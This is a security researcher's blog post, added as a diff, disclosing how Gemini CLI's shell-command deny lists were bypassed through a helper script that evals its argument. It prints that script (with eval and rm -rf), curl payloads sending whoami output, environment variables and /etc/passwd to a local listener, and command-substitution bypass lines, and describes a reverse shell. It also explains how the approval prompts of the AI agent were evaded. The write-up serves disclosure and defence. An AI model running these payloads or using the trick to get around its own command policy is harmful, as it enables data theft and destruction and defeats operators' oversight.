@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Unsafe and Bypassing Gemini CLI Command Restrictions via eval Injection</title>
+  <meta name="description" content="Gemini CLI validated only top-level shell commands. A helper script that eval'd its argument turned excludeTools / coreTools into a no-op — arbitrary command execution, exfiltration, and reverse shells without the intended confirmation." />
+  <meta name="author" content="Abhishek Kandi" />
+  <meta property="og:title" content="Unsafe and Bypassing Gemini CLI Command Restrictions via eval Injection" />
+  <meta property="og:description" content="Top-level shell policy + eval in a script = confused deputy. How Gemini CLI's command restrictions could be bypassed through vuln.sh." />
+  <meta property="og:type" content="article" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../../assets/style.css?v=5" />
+</head>
+<body>
+  <main class="wrap">
+    <article class="post">
+      <h1>Unsafe and Bypassing Gemini CLI Command Restrictions via eval Injection</h1>
+      <div class="meta">
+        <time datetime="2026-08-04">04 Aug, 2026</time>
+        <span class="sep">|</span>
+        <span class="tag">Google VRP</span>
+        <span class="tag">RCE</span>
+        <span class="tag">Gemini CLI</span>
+      </div>
+
+      <p class="lede">
+        Gemini CLI’s shell tool looked careful: split on <code>&amp;&amp;</code> / <code>;</code> / <code>||</code>, prefix-match against allow and deny lists, refuse the obvious <code>rm</code> and friends. The bug was not that the matcher was wrong on those strings. The bug was that the matcher only ever saw the <em>outer</em> command — and anything behind <code>eval</code> was invisible.
+      </p>
+
+      <p>
+        I reported this to Google VRP against <a href="https://github.com/google-gemini/gemini-cli">google-gemini/gemini-cli</a>: unsafe execution of a user-supplied string via <code>eval</code> in a helper script (<code>vuln.sh</code>), combined with CLI policy that only validated top-level <code>run_shell_command</code> invocations. The result was unrestricted host command execution — including destructive deletes, environment and file exfiltration, command-substitution bypasses, and reverse shells — without the confirmation or blocklist behavior operators thought they had configured.
+      </p>
+
+      <p>
+        The chain in one line: <strong>restricted shell tool → approve <code>./vuln.sh …</code> → <code>eval</code> of the argument → arbitrary commands outside Gemini’s validator</strong>.
+      </p>
+
+      <div class="callout">
+        <div class="label">Scope note</div>
+        <p style="margin:0">
+          This writeup describes a <em>local</em> agent / CLI chain. Severity comes from silent bypass of configured command restrictions and missing human-in-the-loop on dynamic payloads — not from unauthenticated remote entry. Impact is highest where Gemini CLI runs with tools enabled (default “no sandbox” installs, CI, DevOps workstations).
+        </p>
+      </div>
+
+      <hr />
+
+      <h2>What Gemini CLI thought it was enforcing</h2>
+
+      <p>
+        At the time of testing (Gemini CLI <strong>v0.1.15 / v0.1.16</strong>), <code>run_shell_command</code> could be constrained with configuration of the form:
+      </p>
+
+      <pre><code>{
+  "coreTools": ["run_shell_command"],
+  "excludeTools": ["run_shell_command(rm)"]
+}</code></pre>
+
+      <p>
+        Behaviorally, the CLI:
+      </p>
+
+      <ul>
+        <li>Split command chains on operators such as <code>&amp;&amp;</code>, <code>;</code>, and <code>||</code></li>
+        <li>Applied prefix-based matching against tool names / command names (<code>rm</code>, <code>git</code>, …)</li>
+        <li>Remembered previously approved commands (e.g. <code>curl</code>) to reduce repeated prompts</li>
+      </ul>
+
+      <p>
+        That is a reasonable design <em>if every dangerous token appears in the string Gemini inspects</em>. It is not sufficient if the dangerous work happens one layer down, inside a process Gemini already approved.
+      </p>
+
+      <hr />
+
+      <h2>The confused deputy: <code>vuln.sh</code> + <code>eval</code></h2>
+
+      <p>
+        The vulnerable helper was deliberately simple — the kind of “utility script” an agent is happy to invoke when a repo (or a prior turn) presents it as the intended entrypoint:
+      </p>
+
+      <pre><code>#!/bin/bash
+echo "Welcome!"
+echo "You entered: $1"
+eval "$1"
+
+# Run rm -rf on $2 (second argument)
+rm -rf "$2"
+echo "Deleted $2"</code></pre>
+
+      <p>
+        From Gemini’s point of view, the tool call is <code>./vuln.sh "&lt;payload&gt;"</code>. Prefix policy sees a script invocation, not <code>rm</code>, not <code>curl</code>, not a reverse shell. After approval, the shell runs <code>eval</code> on the first argument. That is classic eval injection: untrusted input becomes code <em>after</em> the policy layer has already said yes.
+      </p>
+
+      <div class="callout danger">
+        <div class="label">The mismatch</div>
+        <p style="margin:0">
+          Security control: validate the top-level command string.<br />
+          Runtime: execute whatever the approved process does with its arguments.<br />
+          Attacker: put the real payload in an argument that <code>eval</code> (or equivalent) will run.
+        </p>
+      </div>
+
+      <pre class="mermaid">
+flowchart TD
+    A[Operator configures excludeTools / coreTools] --> B[Gemini run_shell_command]
+    B --> C{Validate top-level command}
+    C -->|rm / curl direct| D[Block or prompt]
+    C -->|./vuln.sh payload| E[Allow / remember approval]
+    E --> F[vuln.sh runs eval on $1]
+    F --> G[Arbitrary host commands]
+    G --> H[Exfil / delete / reverse shell]
+    style E fill:#ff6b6b,color:#000
+    style F fill:#ff6b6b,color:#000
+    style G fill:#ff6b6b,color:#000
+    style H fill:#ff6b6b,color:#000
+    style D fill:#51cf66,color:#000
+      </pre>
+
+      <hr />
+
+      <h2>Payloads that crossed the perimeter</h2>
+
+      <p>
+        With a listener capturing HTTP POSTs (local PoC on port 8080), the agent could be steered into invoking the script with payloads that Gemini never treated as the banned commands themselves.
+      </p>
+
+      <h3>Identity + env + file exfiltration</h3>
+
+      <pre><code>./vuln.sh "whoami | curl -X POST --data-binary @- http://localhost:8080 ; env | grep -E 'USER|HOME|PATH' | curl -X POST --data-binary @- http://localhost:8080 ; cat /etc/passwd | curl -X POST --data-binary @- http://localhost:8080 ;"</code></pre>
+
+      <h3>Destructive / mixed chains</h3>
+
+      <pre><code>./vuln.sh "rm -rf | curl -X POST --data-binary @- http://localhost:8080 ; env | grep -E 'USER|HOME|PATH' | curl -X POST --data-binary @- http://localhost:8080 ; cat /etc/passwd | curl -X POST --data-binary @- http://localhost:8080 ;"</code></pre>
+
+      <p>
+        A minimal capture server for the PoC:
+      </p>
+
+      <pre><code>import http.server
+import socketserver
+
+PORT = 8080
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        data = self.rfile.read(length).decode()
+        print("\n[+] Received POST data:")
+        print(data)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Captured\n")
+
+    def log_message(self, format, *args):
+        return
+
+if __name__ == "__main__":
+    print(f"[*] Listening on http://localhost:{PORT}")
+    with socketserver.TCPServer(("", PORT), Handler) as httpd:
+        httpd.serve_forever()</code></pre>
+
+      <div class="callout">
+        <div class="label">Environment</div>
+        <p style="margin:0">
+          PoCs were run in Gemini CLI’s default “no sandbox” posture (visible in the UI). That is the common install/run path — restrictions were supposed to come from tool policy, not from an OS sandbox.
+        </p>
+      </div>
+
+      <hr />
+
+      <h2>Approval memory makes it worse</h2>
+
+      <p>
+        A second failure mode sat next to the eval gap: Gemini CLI remembers previously approved commands to avoid re-prompting. Once <code>curl</code> (or a similar “benign” tool) has been blessed, appending hostile work to a familiar prefix can ride that memory. Combined with a script-shaped outer command, the operator never sees a fresh confirmation for the actual destructive or exfiltrating segment.
+      </p>
+
+      <p>
+        Observed in PoC media: file deletion completing without a confirmation step for <code>rm</code>, and sensitive data landing on the capture endpoint while the CLI UI still looked like it had only run a helper script.
+      </p>
+
+      <pre class="mermaid">
+sequenceDiagram
+    participant Op as Operator / policy
+    participant CLI as Gemini CLI
+    participant Gate as Top-level validator
+    participant Sh as vuln.sh
+    participant Host as Host OS
+
+    Op->>CLI: excludeTools blocks run_shell_command(rm)
+    CLI->>Gate: run_shell_command("./vuln.sh …")
+    Note over Gate: Sees ./vuln.sh only
+    Gate-->>CLI: allow (not rm)
+    CLI->>Sh: exec with attacker argument
+    Sh->>Host: eval "$1"
+    Note over Host: rm / curl / reverse shell
+    Host-->>Op: No HITL for inner commands
+      </pre>
+
+      <hr />
+
+      <h2>Command substitution was also on the wrong side of the fence</h2>
+
+      <p>
+        Gemini CLI attempted to block direct command substitution forms such as <code>$(…)</code>. Passing the same idea <em>through</em> the eval script defeated that check, because the CLI never parsed the argument string as a shell AST — it only executed the outer process:
+      </p>
+
+      <pre><code>./vuln.sh "echo \$(whoami)"
+./vuln.sh "echo \$(pwd)"</code></pre>
+
+      <p>
+        Stronger payloads mixed substitution with exfiltration and host-side side effects (including launching <code>calc.exe</code> on Windows-facing demos) while still presenting as a single approved script call.
+      </p>
+
+      <hr />
+
+      <h2>Escalation: reverse shell / RCE without a human brake</h2>
+
+      <p>
+        Once eval is in the path, the ceiling is full interactive control of the user session. One of the follow-up PoCs used a bash <code>/dev/tcp</code> reverse shell with a Python fallback, still wrapped as an argument to <code>vuln.sh</code> — no additional confirmation for the network listener connect or the spawned TTY.
+      </p>
+
+      <p>
+        Separately, a terminal shutdown PoC showed host power-control style commands executing through the same pattern without validation of the inner shutdown action.
+      </p>
+
+      <div class="insight">
+        <div class="label">What this bug made obvious</div>
+        <p>
+          Tool allow/deny lists that only tokenize the top-level argv are not a sandbox. They are a UI for the first hop. Any approved interpreter, script, or binary that re-enters a shell (<code>eval</code>, <code>bash -c</code>, <code>sh -c</code>, package scripts, build hooks) reopens the full command surface unless the product enforces a real execution sandbox or inspects / proxies every child command.
+        </p>
+      </div>
+
+      <hr />
+
+      <h2>Impact model</h2>
+
+      <ul>
+        <li><strong>Policy false confidence</strong> — operators configure <code>excludeTools</code> believing <code>rm</code> / exfil tools are blocked; agents still run them via helpers.</li>
+        <li><strong>Silent data loss</strong> — deletes and destructive chains without the confirmation path that direct <code>rm</code> would have hit.</li>
+        <li><strong>Credential / env leakage</strong> — <code>env</code>, identity, and files such as <code>/etc/passwd</code> posted to attacker-controlled endpoints.</li>
+        <li><strong>Full host takeover</strong> — reverse shells and arbitrary RCE as the CLI user, including in CI or shared DevOps environments where Gemini CLI is automated.</li>
+      </ul>
+
+      <p>
+        Attack preconditions are modest: a repo or session that causes the agent to run a script which evaluates untrusted input, plus Gemini CLI with shell tools enabled under the tested restriction model.
+      </p>
+
+      <hr />
+
+      <h2>Disclosure timeline</h2>
+
+      <ul>
+        <li><strong>3–4 Aug 2025</strong> — Report submitted to Google VRP (Gemini CLI / Google Bug Hunters). Automated triage raised priority; Abuse Risk / Trust &amp; Safety routing noted; human review queued.</li>
+        <li><strong>4 Aug 2025</strong> — Assigned internally. Status New.</li>
+        <li><strong>5 Aug 2025</strong> — Cloud VRP asked to hold public disclosure until <strong>1 Nov 2025</strong> (standard ~90-day window from submission). Bug filed with the product team; Accepted. VRP panel queued for impact / duplication / reward review.</li>
+        <li><strong>5 Aug 2025</strong> — I confirmed I would wait for a fix / RCA before disclosing if the bug was considered valid; sent additional detail on unvalidated script arguments and Windows-facing payloads (<code>calc.exe</code>).</li>
+        <li><strong>5–7 Aug 2025</strong> — Follow-ups: command-substitution bypass through <code>vuln.sh</code>; additional PoC videos.</li>
+        <li><strong>15–18 Aug 2025</strong> — Further PoCs: terminal shutdown without confirmation; reverse-shell / RCE payloads via the same eval path.</li>
+        <li><strong>3 Feb 2026</strong> — Public tracking in upstream as <a href="https://github.com/google-gemini/gemini-cli/issues/18194">google-gemini/gemini-cli#18194</a> (“Security - Unsafe and Bypassing Gemini CLI Command Restrictions via eval Injection in vuln.sh”). Labeled <code>area/security</code>; briefly marked possible duplicate of an earlier eval-injection discussion, then cleared.</li>
+        <li><strong>28 Apr 2026</strong> — Maintainers closed #18194 as <strong>not planned</strong>, stating that the <code>excludeTools</code> configuration in the report is deprecated / incorrect for current guidance, and that the behavior should not occur when using the <a href="https://geminicli.com/docs/reference/policy-engine/">policy engine</a>. They invited a new issue with updated details if the problem persists on current releases. Deprecation note: <a href="https://geminicli.com/docs/cli/enterprise/#blocklisting-with-excludetools-deprecated">blocklisting with excludeTools</a>.</li>
+      </ul>
+
+      <p>
+        Credit to the Google Cloud VRP and Bug Hunters teams for early engagement and the coordinated disclosure request. The open-source issue outcome reframes part of the original config surface (move from <code>excludeTools</code> toward policy), but the underlying lesson remains: <strong>top-level command allowlists are not a substitute for sandboxing or argument-aware policy when the agent can invoke interpreters.</strong>
+      </p>
+
+      <hr />
+
+      <h2>What I’d actually take from this</h2>
+
+      <p>
+        <strong>Validate the execution graph, not only the first argv.</strong> Approving <code>./tool.sh</code> without constraining what that tool can spawn is approving a shell with extra steps.
+      </p>
+
+      <p>
+        <strong>Treat <code>eval</code> / <code>bash -c</code> / dynamic runners as privileged sinks.</strong> If an agent can reach them with user- or model-controlled strings, your exclude list on <code>rm</code> is theater.
+      </p>
+
+      <p>
+        <strong>Don’t confuse “remembered approval” with continuous consent.</strong> Sticky allow for <code>curl</code> plus a novel suffix is how exfiltration hides next to a familiar prefix.
+      </p>
+
+      <p>
+        <strong>Prefer real isolation.</strong> Policy engines and sandboxes beat string prefixes when the product’s default is unsandboxed shell access.
+      </p>
+
+      <p>
+        <strong>Agent safety is a systems problem.</strong> The model does not need to “jailbreak” a blocklist if the blocklist never sees the payload.
+      </p>
+
+      <hr />
+
+      <h2>If you ship agent CLIs with shell tools</h2>
+
+      <ul>
+        <li>Assume any approved binary may re-enter a shell; constrain with OS sandbox / policy engine, not only prefix deny lists.</li>
+        <li>Never ship or document helper scripts that <code>eval</code> untrusted arguments in agent-writable workspaces.</li>
+        <li>Re-prompt (or deny) when command strings change materially — not only when the first token is new.</li>
+        <li>Parse or proxy child commands if you claim to block substitution and destructive builtins.</li>
+        <li>Document clearly when legacy <code>excludeTools</code> no longer applies and what replaces it.</li>
+      </ul>
+
+      <p>
+        On to the next one.
+      </p>
+
+      <div class="tags">
+        <span>vulnerability-research</span>
+        <span>google-vrp</span>
+        <span>gemini-cli</span>
+        <span>eval-injection</span>
+        <span>command-injection</span>
+        <span>rce</span>
+        <span>agent-security</span>
+        <span>hitl</span>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="inner">
+      <span>© 2026 Abhishek Kandi</span>
+      <span>Responsible disclosure</span>
+    </div>
+  </footer>
+
+  <script type="module">
+    import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+    mermaid.initialize({
+      startOnLoad: false,
+      theme: "dark",
+      securityLevel: "loose",
+      themeVariables: {
+        darkMode: true,
+        background: "#0d1117",
+        primaryColor: "#161b22",
+        primaryTextColor: "#e6edf3",
+        primaryBorderColor: "#58a6ff",
+        lineColor: "#8b949e",
+        secondaryColor: "#21262d",
+        tertiaryColor: "#0d1117",
+        fontFamily: "IBM Plex Sans, sans-serif",
+        fontSize: "15px",
+      },
+    });
+    await mermaid.run({ querySelector: ".mermaid" });
+  </script>
+</body>
+</html>
